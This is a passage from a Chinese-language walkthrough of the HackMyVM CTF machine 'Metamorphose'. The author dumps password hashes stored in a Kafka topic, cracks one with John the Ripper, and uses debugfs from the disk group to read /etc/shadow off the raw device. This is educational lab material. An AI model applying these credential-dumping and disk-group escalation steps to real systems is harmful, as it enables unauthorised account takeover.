lrwxrwxrwx   1 root root       7 Feb 26 09:57 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Feb 26 09:57 lib64 -> usr/lib64
drwx------   2 root root   16384 Feb 26 09:57 lost+found
drwxr-xr-x   3 root root    4096 Feb 26 09:57 media
drwxr-xr-x   2 root root    4096 Feb 26 09:57 mnt
drwxr-xr-x   3 root root    4096 Feb 26 16:50 opt
dr-xr-xr-x 139 root root       0 Aug  5 15:26 proc
drwx------   4 root root    4096 Mar  3 14:05 root
drwxr-xr-x  17 root root     500 Aug  5 15:26 run
lrwxrwxrwx   1 root root       8 Feb 26 09:57 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Feb 26 09:57 srv
dr-xr-xr-x  13 root root       0 Aug  5 15:26 sys
drwxrwxrwt   8 root root 8089600 Aug  5 15:31 tmp
drwxr-xr-x  12 root root    4096 Feb 26 09:57 usr
drwxr-xr-x  11 root root    4096 Feb 26 09:57 var
lrwxrwxrwx   1 root root      27 May 28 11:22 vmlinuz -> boot/vmlinuz-6.1.0-21-amd64
lrwxrwxrwx   1 root root      27 Feb 26 09:58 vmlinuz.old -> boot/vmlinuz-6.1.0-18-amd64
(remote) melbourne@metamorphose.hmv:/$ cd opt
(remote) melbourne@metamorphose.hmv:/opt$ ls -la
total 272
drwxr-xr-x  3 root root   4096 Feb 26 16:50 .
drwxr-xr-x 18 root root 266240 May 28 11:22 ..
drwxrwxr-x  8 root root   4096 Feb 26 16:59 kafka
(remote) melbourne@metamorphose.hmv:/opt$ cd kafka/
(remote) melbourne@metamorphose.hmv:/opt/kafka$ ls -la
total 268
drwxrwxr-x 8 root root   4096 Feb 26 16:59 .
drwxr-xr-x 3 root root   4096 Feb 26 16:50 ..
drwxrwxr-x 3 root root   4096 Feb 17 10:09 bin
drwxrwxr-x 3 root root   4096 Feb 25 13:24 config
-rw-r--r-- 1 root root 176919 Aug  5 15:27 kafka.log
drwxrwxr-x 2 root root  12288 Feb 14 19:45 libs
-rwxrwxr-x 1 root root  15030 Nov 24  2023 LICENSE
drwxrwxr-x 2 root root   4096 Nov 24  2023 licenses
drwxrwxr-x 4 root root  12288 Aug  5 17:02 logs
-rwxrwxr-x 1 root root  28184 Nov 24  2023 NOTICE
drwxrwxr-x 2 root root   4096 Nov 24  2023 site-docs
```

### 提取相关信息

依照作者的一贯思路，东西喜欢丢在`opt`里，尝试提取一下信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058525.png" alt="image-20240805234930821" style="zoom:50%;" />

瞅一眼：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058526.png" alt="image-20240805235206219" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058527.png" alt="image-20240805235825887" style="zoom:50%;" />

```bash
(remote) melbourne@metamorphose.hmv:/opt/kafka/bin$ ./kafka-console-consumer.sh --bootstrap-server broker:9092 --from-beginning --property print.key=true --property key.separator="-"
Exactly one of --include/--topic is required. ()
Option                                   Description                            
------                                   -----------                            
--bootstrap-server <String: server to    REQUIRED: The server(s) to connect to. 
  connect to>                                                                   
--consumer-property <String:             A mechanism to pass user-defined       
  consumer_prop>                           properties in the form key=value to  
                                           the consumer.                        
--consumer.config <String: config file>  Consumer config properties file. Note  
                                           that [consumer-property] takes       
                                           precedence over this config.         
--enable-systest-events                  Log lifecycle events of the consumer   
                                           in addition to logging consumed      
                                           messages. (This is specific for      
                                           system tests.)                       
--formatter <String: class>              The name of a class to use for         
                                           formatting kafka messages for        
                                           display. (default: kafka.tools.      
                                           DefaultMessageFormatter)             
--formatter-config <String: config       Config properties file to initialize   
  file>                                    the message formatter. Note that     
                                           [property] takes precedence over     
                                           this config.                         
--from-beginning                         If the consumer does not already have  
                                           an established offset to consume     
                                           from, start with the earliest        
                                           message present in the log rather    
                                           than the latest message.             
--group <String: consumer group id>      The consumer group id of the consumer. 
--help                                   Print usage information.               
--include <String: Java regex (String)>  Regular expression specifying list of  
                                           topics to include for consumption.   
--isolation-level <String>               Set to read_committed in order to      
                                           filter out transactional messages    
                                           which are not committed. Set to      
                                           read_uncommitted to read all         
                                           messages. (default: read_uncommitted)
--key-deserializer <String:                                                     
  deserializer for key>                                                         
--max-messages <Integer: num_messages>   The maximum number of messages to      
                                           consume before exiting. If not set,  
                                           consumption is continual.            
--offset <String: consume offset>        The offset to consume from (a non-     
                                           negative number), or 'earliest'      
                                           which means from beginning, or       
                                           'latest' which means from end        
                                           (default: latest)                    
--partition <Integer: partition>         The partition to consume from.         
                                           Consumption starts from the end of   
                                           the partition unless '--offset' is   
                                           specified.                           
--property <String: prop>                The properties to initialize the       
                                           message formatter. Default           
                                           properties include:                  
                                          print.timestamp=true|false            
                                          print.key=true|false                  
                                          print.offset=true|false               
                                          print.partition=true|false            
                                          print.headers=true|false              
                                          print.value=true|false                
                                          key.separator=<key.separator>         
                                          line.separator=<line.separator>       
                                          headers.separator=<line.separator>    
                                          null.literal=<null.literal>           
                                          key.deserializer=<key.deserializer>   
                                          value.deserializer=<value.            
                                           deserializer>                        
                                          header.deserializer=<header.          
                                           deserializer>                        
                                         Users can also pass in customized      
                                           properties for their formatter; more 
                                           specifically, users can pass in      
                                           properties keyed with 'key.          
                                           deserializer.', 'value.              
                                           deserializer.' and 'headers.         
                                           deserializer.' prefixes to configure 
                                           their deserializers.                 
--skip-message-on-error                  If there is an error when processing a 
                                           message, skip it instead of halt.    
--timeout-ms <Integer: timeout_ms>       If specified, exit if no message is    
                                           available for consumption for the    
                                           specified interval.                  
--topic <String: topic>                  The topic to consume on.               
--value-deserializer <String:                                                   
  deserializer for values>                                                      
--version                                Display Kafka version.                 
--whitelist <String: Java regex          DEPRECATED, use --include instead;     
  (String)>                                ignored if --include specified.      
                                           Regular expression specifying list   
                                           of topics to include for consumption.
```

发现缺少一个topic，尝试进行寻找：https://www.cnblogs.com/AcAc-t/p/kafka_topic_consumer_group_command.html

```shell
# 查看kafka topic列表，使用--list参数
bin/kafka-topics.sh --zookeeper 127.0.0.1:2181 --list
__consumer_offsets
lx_test_topic
test

# 查看kafka特定topic的详情，使用--topic与--describe参数
bin/kafka-topics.sh --zookeeper 127.0.0.1:2181 --topic lx_test_topic --describe
Topic:lx_test_topic     PartitionCount:1        ReplicationFactor:1     Configs:
Topic: lx_test_topic    Partition: 0    Leader: 0       Replicas: 0     Isr: 0

# 查看consumer group列表，使用--list参数
# 查看consumer group列表有新、旧两种命令，分别查看新版(信息保存在broker中)consumer列表和老版(信息保存在zookeeper中)consumer列表，因而需要区分指定bootstrap--server和zookeeper参数：
bin/kafka-consumer-groups.sh --new-consumer --bootstrap-server 127.0.0.1:9292 --list
lx_test

bin/kafka-consumer-groups.sh --zookeeper 127.0.0.1:2181 --list
console-consumer-86845
console-consumer-11967

# 查看特定consumer group 详情，使用--group与--describe参数
# 同样根据新/旧版本的consumer，分别指定bootstrap-server与zookeeper参数:
bin/kafka-consumer-groups.sh --new-consumer --bootstrap-server 127.0.0.1:9292 --group lx_test --describe
GROUP                          TOPIC                          PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             OWNER
lx_test                        lx_test_topic             0          465             465             0               kafka-python-1.3.1_/127.0.0.1

bin/kafka-consumer-groups.sh --zookeeper 127.0.0.1:2181 --group console-consumer-11967 --describe
GROUP                          TOPIC                          PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG             OWNER
Could not fetch offset from zookeeper for group console-consumer-11967 partition [lx_test_topic,0] due to missing offset data in zookeeper.
console-consumer-11967         lx_test_topic             0          unknown         465             unknown         console-consumer-11967_aws-lx-1513787888172-d3a91f05-0
```

尝试按照[及时](https://home.cnblogs.com/u/AcAc-t/)师傅的写法进行操作：

```bash
(remote) melbourne@metamorphose.hmv:/opt/kafka/bin$ ./kafka-topics.sh --bootstrap-server 127.0.0.1:9092 --list
__consumer_offsets
internal_logs
user_feedback
users.properties
```

获取到了topic信息，进一步进行提取信息：

```bash
(remote) melbourne@metamorphose.hmv:/opt/kafka/bin$ ./kafka-console-consumer.sh --topic users.properties --bootstrap-server localhost:9092 --from-beginning --property print.key=true --property key.separator="-"
null-{"username": "root", "password": "e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054", "email": "root@metamorphose.hmv", "role": "admin"}
null-{"username": "saman", "password": "5b5ba511537a7871212f7a978f708aef60a02b80e77ed14dcc59cbd019d6791d", "email": "saman@metamorphose.hmv", "role": "editor"}
null-{"username": "michele", "password": "77e19ed98cf4b945e9034efb30779abd21c70a7b4e3b0ae92ab50db9ca39a75b", "email": "michele@metamorphose.hmv", "role": "viewer"}
null-{"username": "oleesa", "password": "f44609c0c1fe331267c8fe1069f4b67fd67ff95fb9742eede4ec9028fa770bdd", "email": "oleesa@metamorphose.hmv", "role": "admin"}
null-{"username": "sarene", "password": "2f15dacafe7b70bfa88d07d15026cdd40799264c36c120e34a28e7659b6a928d", "email": "sarene@metamorphose.hmv", "role": "viewer"}
null-{"username": "janella", "password": "bc5219396bb2a0de2e0776ad1078f67c417da95d5e009989d7d4ea14823bfb5a", "email": "janella@metamorphose.hmv", "role": "viewer"}
null-{"username": "bronson", "password": "a0ef680b09d2f9821d69416d6c5629d3f109751c0fc3a77592041644e268a65e", "email": "bronson@metamorphose.hmv", "role": "admin"}
null-{"username": "vonda", "password": "b1d83b7991c7a2286abfc2ba555e426a4dd7db4072815f71e3ec45406ab8dd7d", "email": "vonda@metamorphose.hmv", "role": "viewer"}
null-{"username": "toshinari", "password": "5018f7be54a3f684bb01b2d21e293a423f5978da36e19c86abc085d9514b56d2", "email": "toshinari@metamorphose.hmv", "role": "editor"}
null-{"username": "laurie", "password": "597f3fdd0ba9d4af8699dc30e4d1c8c74551e10a56eaad108d34b28ac8d353c7", "email": "laurie@metamorphose.hmv", "role": "user"}
null-{"username": "alia", "password": "d2e5eda5bf734608f1585adffc30846340878e0ab1f0be572ac79f88ac4c808e", "email": "alia@metamorphose.hmv", "role": "admin"}
null-{"username": "raj", "password": "3a76752b3c949f0bdaed819d0f61ae6ca863e5235062a004b23e65059cae6fdd", "email": "raj@metamorphose.hmv", "role": "editor"}
null-{"username": "arleen", "password": "aaf6946a8e02f31cc9542a0bb1cfa6dd49ccd01d57802417a28cf493ad7ff5ad", "email": "arleen@metamorphose.hmv", "role": "editor"}
null-{"username": "melbourne", "password": "a08aa555a5e5b7a73125cf367176ce446eb1d0c07a068077ab4f740a8fded545", "email": "melbourne@metamorphose.hmv", "role": "admin"}
null-{"username": "carolyn", "password": "544c4de6388bf397d905015b085ee359f3813550912467bed347e666d35a1fee", "email": "carolyn@metamorphose.hmv", "role": "viewer"}
null-{"username": "coralie", "password": "9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e", "email": "coralie@metamorphose.hmv", "role": "admin"}
null-{"username": "farhad", "password": "157e2743e9edc74a954fc6cfa82f77801b66781091955cf0284f0e3819d51dfc", "email": "farhad@metamorphose.hmv", "role": "editor"}
null-{"username": "felix", "password": "3fe0e7fbd33d9ca82f77d1a0c2ff4c28b0d35b8024c61a05bd244ccc28d53816", "email": "felix@metamorphose.hmv", "role": "admin"}
null-{"username": "chase", "password": "e387178e3c60967aadc8e8a795a819d24493c05e2d999e56bf01d08654ef80d2", "email": "chase@metamorphose.hmv", "role": "editor"}
null-{"username": "blakeley", "password": "7cd774b3d7a0d7e8696b0cab072c0cc50dd7ab2ac3db362ebe2cd154a3505b78", "email": "blakeley@metamorphose.hmv", "role": "admin"}
null-{"username": "risa", "password": "9dee3c618985708c50c53854751297a10abc8b02e9f416137816fc408145a6b3", "email": "risa@metamorphose.hmv", "role": "editor"}
null-{"username": "paddy", "password": "d24214a379e0a1115185de1415c0c38f9a90803f1188fb366506eb96b219b838", "email": "paddy@metamorphose.hmv", "role": "editor"}
null-{"username": "min", "password": "c84ef95012d8f8baa4d62b1ea791c158a5daa7f82f611b2b33d344cb14779ceb", "email": "min@metamorphose.hmv", "role": "viewer"}
null-{"username": "ezmeralda", "password": "362d8c0d990e1f8583047fbb0114691e2716a0f11d751ce29604611a7e38275d", "email": "ezmeralda@metamorphose.hmv", "role": "editor"}
null-{"username": "lita", "password": "dd3e6e2665d0f27ecce3a7e017c4d7656ad8e5a78d9d40d21bc044cf96097d66", "email": "lita@metamorphose.hmv", "role": "viewer"}
null-{"username": "angeline", "password": "b460021a7bb42c159a2382a9b1f73944b292bf9748f3a063c5e6a2b73db7ba53", "email": "angeline@metamorphose.hmv", "role": "user"}
null-{"username": "sheridan", "password": "8717128e8774950dc2e58f899bbab4a4ba91fe34ac564d00ec4006169fa0fcc5", "email": "sheridan@metamorphose.hmv", "role": "admin"}
null-{"username": "reid", "password": "a0d1968ca7d8580f53b3b65775a7e126e1d4f6054d396f47ede1e65893d653b3", "email": "reid@metamorphose.hmv", "role": "editor"}
null-{"username": "asher", "password": "1f8642763371ca486ff7a5df412fa8c98abac2371032f35835d15dbdf80cab70", "email": "asher@metamorphose.hmv", "role": "editor"}
null-{"username": "lakyn", "password": "2ac9ee0d8724e344fd8b53b13183e8d66a6ba492b8f52960ef90ddb3c369128a", "email": "lakyn@metamorphose.hmv", "role": "user"}
null-{"username": "aviva", "password": "9daa3d43959547cb632bd9234454ac4a655b1b56d2bcee35d72e9121c0e82768", "email": "aviva@metamorphose.hmv", "role": "user"}
null-{"username": "chabane", "password": "966c4d1242e3c0003d6941ef1a202998ec3b48370728e40505096bfb54039e55", "email": "chabane@metamorphose.hmv", "role": "admin"}
^CProcessed a total of 32 messages
```

尝试提取一下相关信息，然后进行爆破：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat text | awk -F '["]' '{print $4}' > user                                       
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat text | awk -F '["]' '{print $8}' > pass
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ paste user pass                                 
root    e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054
saman   5b5ba511537a7871212f7a978f708aef60a02b80e77ed14dcc59cbd019d6791d
michele 77e19ed98cf4b945e9034efb30779abd21c70a7b4e3b0ae92ab50db9ca39a75b
oleesa  f44609c0c1fe331267c8fe1069f4b67fd67ff95fb9742eede4ec9028fa770bdd
sarene  2f15dacafe7b70bfa88d07d15026cdd40799264c36c120e34a28e7659b6a928d
janella bc5219396bb2a0de2e0776ad1078f67c417da95d5e009989d7d4ea14823bfb5a
bronson a0ef680b09d2f9821d69416d6c5629d3f109751c0fc3a77592041644e268a65e
vonda   b1d83b7991c7a2286abfc2ba555e426a4dd7db4072815f71e3ec45406ab8dd7d
toshinari       5018f7be54a3f684bb01b2d21e293a423f5978da36e19c86abc085d9514b56d2
laurie  597f3fdd0ba9d4af8699dc30e4d1c8c74551e10a56eaad108d34b28ac8d353c7
alia    d2e5eda5bf734608f1585adffc30846340878e0ab1f0be572ac79f88ac4c808e
raj     3a76752b3c949f0bdaed819d0f61ae6ca863e5235062a004b23e65059cae6fdd
arleen  aaf6946a8e02f31cc9542a0bb1cfa6dd49ccd01d57802417a28cf493ad7ff5ad
melbourne       a08aa555a5e5b7a73125cf367176ce446eb1d0c07a068077ab4f740a8fded545
carolyn 544c4de6388bf397d905015b085ee359f3813550912467bed347e666d35a1fee
coralie 9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e
farhad  157e2743e9edc74a954fc6cfa82f77801b66781091955cf0284f0e3819d51dfc
felix   3fe0e7fbd33d9ca82f77d1a0c2ff4c28b0d35b8024c61a05bd244ccc28d53816
chase   e387178e3c60967aadc8e8a795a819d24493c05e2d999e56bf01d08654ef80d2
blakeley        7cd774b3d7a0d7e8696b0cab072c0cc50dd7ab2ac3db362ebe2cd154a3505b78
risa    9dee3c618985708c50c53854751297a10abc8b02e9f416137816fc408145a6b3
paddy   d24214a379e0a1115185de1415c0c38f9a90803f1188fb366506eb96b219b838
min     c84ef95012d8f8baa4d62b1ea791c158a5daa7f82f611b2b33d344cb14779ceb
ezmeralda       362d8c0d990e1f8583047fbb0114691e2716a0f11d751ce29604611a7e38275d
lita    dd3e6e2665d0f27ecce3a7e017c4d7656ad8e5a78d9d40d21bc044cf96097d66
angeline        b460021a7bb42c159a2382a9b1f73944b292bf9748f3a063c5e6a2b73db7ba53
sheridan        8717128e8774950dc2e58f899bbab4a4ba91fe34ac564d00ec4006169fa0fcc5
reid    a0d1968ca7d8580f53b3b65775a7e126e1d4f6054d396f47ede1e65893d653b3
asher   1f8642763371ca486ff7a5df412fa8c98abac2371032f35835d15dbdf80cab70
lakyn   2ac9ee0d8724e344fd8b53b13183e8d66a6ba492b8f52960ef90ddb3c369128a
aviva   9daa3d43959547cb632bd9234454ac4a655b1b56d2bcee35d72e9121c0e82768
chabane 966c4d1242e3c0003d6941ef1a202998ec3b48370728e40505096bfb54039e5
```

爆破一下，等一下，先看一下有哪些用户是在电脑上的：

```bash
(remote) melbourne@metamorphose.hmv:/home$ ls -la
total 276
drwxr-xr-x  4 root      root        4096 Feb 26 17:14 .
drwxr-xr-x 18 root      root      266240 May 28 11:22 ..
drwx------  2 coralie   coralie     4096 Feb 26 17:32 coralie
drwx------  3 melbourne melbourne   4096 Feb 26 17:32 melbourne
(remote) melbourne@metamorphose.hmv:/home$ cat /etc/passwd | grep /bin
root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
melbourne:x:1000:1000:,,,:/home/melbourne:/bin/bash
coralie:x:1001:1001::/home/coralie:/bin/bash
```

找一下这个`coralie`用户进行爆破：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ paste user pass | grep coralie
coralie 9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "cryptoSafe", but the string is also recognized as "gost"
Use the "--format=gost" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Panama"
Use the "--format=Panama" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "po"
Use the "--format=po" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-Keccak-256"
Use the "--format=Raw-Keccak-256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "skein-256"
Use the "--format=skein-256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Snefru-256"
Use the "--format=Snefru-256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (cryptoSafe [AES-256-CBC])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2024-08-05 12:17) 0g/s 2476Kp/s 2476Kc/s 2476KC/s 02102265315..*7¡Vamos!
Session completed. 
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat hash                                   
9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ hash-identifier                                                    
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
 HASH: ^C

        Bye!
        
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ john --list=formats | grep "SHA-256"
414 formats (149 dynamic formats shown as just "dynamic_n" here)

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ john --list=formats | grep "256"    
414 formats (149 dynamic formats shown as just "dynamic_n" here)
tripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, dummy, crypt

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
my2monkeys       (?)     
1g 0:00:00:00 DONE (2024-08-05 12:23) 7.142g/s 2925Kp/s 2925Kc/s 2925KC/s remmer..kevin56
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

### 提取磁盘信息

先进行切换用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058528.png" alt="image-20240806002423533" style="zoom:50%;" />

```bash
coralie@metamorphose:~$ sudo -l
bash: sudo: command not found
coralie@metamorphose:~$ whoami;id
coralie
uid=1001(coralie) gid=1001(coralie) groups=1001(coralie),6(disk)
coralie@metamorphose:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            962M     0  962M   0% /dev
tmpfs           197M  548K  197M   1% /run
/dev/sda1        29G  4.4G   23G  16% /
tmpfs           984M     0  984M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           197M     0  197M   0% /run/user/1001
```

发现挂载了一个磁盘，尝试看一下有些啥，使用`debugfs`看一下：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ find / -name *debugfs* 2>/dev/null
/usr/share/man/man8/debugfs.8.gz
/usr/lib/modules/6.6.9-amd64/kernel/net/l2tp/l2tp_debugfs.ko.xz
/usr/lib/modules/6.6.9-amd64/kernel/drivers/platform/chrome/cros_ec_debugfs.ko.xz
/usr/lib/modules/6.6.9-amd64/kernel/drivers/platform/chrome/wilco_ec/wilco_ec_debugfs.ko.xz
/usr/sbin/debugfs

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ file /usr/sbin/debugfs            
/usr/sbin/debugfs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24c03a9f2307079cfd9615f13399d74388a2a0db, for GNU/Linux 3.2.0, stripped

coralie@metamorphose:/tmp$ wget http://172.20.10.8:8888/debugfs
--2024-08-05 18:45:40--  http://172.20.10.8:8888/debugfs
Connecting to 172.20.10.8:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 243536 (238K) [application/octet-stream]
Saving to: ‘debugfs’

debugfs                                         100%[====================================================================================================>] 237.83K  --.-KB/s    in 0.004s  

2024-08-05 18:45:40 (56.3 MB/s) - ‘debugfs’ saved [243536/243536]

coralie@metamorphose:/tmp$ chmod +x debugfs 
coralie@metamorphose:/tmp$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            962M     0  962M   0% /dev
tmpfs           197M  548K  197M   1% /run
/dev/sda1        29G  4.4G   23G  16% /
tmpfs           984M     0  984M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           197M     0  197M   0% /run/user/1001
coralie@metamorphose:/tmp$ ./debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  help
Available debugfs requests:

show_debugfs_params, params
                         Show debugfs parameters
open_filesys, open       Open a filesystem
close_filesys, close     Close the filesystem
freefrag, e2freefrag     Report free space fragmentation
feature, features        Set/print superblock features
dirty_filesys, dirty     Mark the filesystem as dirty
init_filesys             Initialize a filesystem (DESTROYS DATA)
show_super_stats, stats  Show superblock statistics
ncheck                   Do inode->name translation
icheck                   Do block->inode translation
change_root_directory, chroot
                         Change root directory
change_working_directory, cd
                         Change working directory
list_directory, ls       List directory
show_inode_info, stat    Show inode information 
dump_extents, extents, ex
                         Dump extents information 
blocks                   Dump blocks used by an inode 
filefrag                 Report fragmentation information for an inode
link, ln                 Create directory link
unlink                   Delete a directory link
mkdir                    Create a directory
rmdir                    Remove a directory
rm                       Remove a file (unlink and kill_file, if appropriate)
kill_file                Deallocate an inode and its blocks
copy_inode               Copy the inode structure
clri                     Clear an inode's contents
freei                    Clear an inode's in-use flag
seti                     Set an inode's in-use flag
testi                    Test an inode's in-use flag
freeb                    Clear a block's in-use flag
setb                     Set a block's in-use flag
testb                    Test a block's in-use flag
modify_inode, mi         Modify an inode by structure
find_free_block, ffb     Find free block(s)
find_free_inode, ffi     Find free inode(s)
print_working_directory, pwd
                         Print current working directory
expand_dir, expand       Expand directory
mknod                    Create a special file
list_deleted_inodes, lsdel
                         List deleted inodes
undelete, undel          Undelete file
write                    Copy a file from your native filesystem
dump_inode, dump         Dump an inode out to a file
cat                      Dump an inode out to stdout
lcd                      Change the current directory on your native filesystem
rdump                    Recursively dump a directory to the native filesystem
set_super_value, ssv     Set superblock value
set_inode_field, sif     Set inode field
set_block_group, set_bg  Set block group descriptor field
logdump                  Dump the contents of the journal
htree_dump, htree        Dump a hash-indexed directory
dx_hash, hash            Calculate the directory hash of a filename
dirsearch                Search a directory for a particular filename
bmap                     Calculate the logical->physical block mapping for an inode
fallocate                Allocate uninitialized blocks to an inode
punch, truncate          Punch (or truncate) blocks from an inode by deallocating them
symlink                  Create a symbolic link
imap                     Calculate the location of an inode
dump_unused              Dump unused blocks
set_current_time         Set current time to use when setting filesystem fields
supported_features       Print features supported by this version of e2fsprogs
dump_mmp                 Dump MMP information
set_mmp_value, smmp      Set MMP value
extent_open, eo          Open inode for extent manipulation
zap_block, zap           Zap block: fill with 0, pattern, flip bits etc.
block_dump, bdump, bd    Dump contents of a block
ea_list                  List extended attributes of an inode
ea_get                   Get an extended attribute of an inode
ea_set                   Set an extended attribute of an inode
ea_rm                    Remove an extended attribute of an inode
list_quota, lq           List quota
get_quota, gq            Get quota
inode_dump, idump, id    Dump the inode structure in hex
journal_open, jo         Open the journal
journal_close, jc        Close the journal
journal_write, jw        Write a transaction to the journal
journal_run, jr          Recover the journal
help                     Display info on command or topic.
list_requests, lr, ?     List available commands.
quit, q                  Leave the subsystem.

debugfs:  cat /etc/shadow
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:19779:0:99999:7:::
daemon:*:19779:0:99999:7:::
bin:*:19779:0:99999:7:::
sys:*:19779:0:99999:7:::
sync:*:19779:0:99999:7:::
games:*:19779:0:99999:7:::
man:*:19779:0:99999:7:::
lp:*:19779:0:99999:7:::
mail:*:19779:0:99999:7:::
news:*:19779:0:99999:7:::
uucp:*:19779:0:99999:7:::
proxy:*:19779:0:99999:7:::
www-data:*:19779:0:99999:7:::
backup:*:19779:0:99999:7:::
list:*:19779:0:99999:7:::
irc:*:19779:0:99999:7:::
_apt:*:19779:0:99999:7:::
nobody:*:19779:0:99999:7:::
systemd-network:!*:19779::::::
systemd-timesync:!*:19779::::::
messagebus:!:19779::::::
avahi-autoipd:!:19779::::::
sshd:!:19779::::::
ntpsec:!:19779::::::
epmd:!:19779::::::
melbourne:$y$j9T$9AW5vMwISGEth89TZdLQX.$3oxC.VAZ57n4S94eRdZzcsGbgIoiAxWTdCP7afTV7x2:19779:0:99999:7:::
coralie:$y$j9T$knJbyxpFrCvXDa/DDdck/1$GKzq8p7o9Qjurg6bzmM6TZtilp3qY8caDnkDYDJas35:19779:0:99999:7:::
```

尝试进行破解：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat passwd
root:x:0:0:root:/root:/bin/bash

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat shadow
